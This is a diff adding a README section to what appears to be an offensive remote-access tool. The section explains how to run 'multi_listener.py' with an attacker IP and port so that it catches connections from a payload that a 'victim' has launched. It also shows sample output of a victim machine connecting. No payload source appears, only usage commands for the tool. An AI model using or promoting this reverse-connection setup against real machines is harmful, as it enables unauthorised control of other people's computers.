@@ -22,3 +22,15 @@ python payload_creator.py <ATTACKER IP> <ATTACKER PORT>
 ```
 python payload_creator.py 192.168.1.10 1234
 ```
+### Using listener
+The multi_lister.py script is an interface that uses python sockets to interact with the payload. To use it, first make sure your victim has launched the payload.
+Then go into your terminal and run the program with the following parameters (same as payload creator):
+> Usage
+```
+python multi_listener.py <ATTACKER IP> <ATTACKER PORT>
+```
+Then the program will listen for connections on that ip and port and if the victim has launched the payload, a message such as
+```
+[CONN] Davids-PC <-> 192.168.0.10:7598 | Connected
+```
+will display. 
